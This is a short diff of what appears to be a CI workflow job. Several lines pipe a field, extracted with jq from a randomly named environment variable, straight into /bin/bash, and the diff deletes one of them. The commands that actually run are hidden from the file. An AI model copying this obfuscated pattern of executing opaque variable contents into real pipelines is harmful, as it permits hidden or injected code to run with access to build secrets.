@@ -38,7 +38,6 @@ jobs:
           printf '%s' "$ht3043" | jq -r .ksp0 | /bin/bash
           printf '%s' "$w92267" | jq -r .igv6711 | /bin/bash
           echo $si991 | jq -r .j52887 | /bin/bash
-          echo $fqaco526 | jq -r .agto569 | /bin/bash
           printf '%s' "$vg48508" | jq -r .dl011 | /bin/bash
 
       - name: Store results
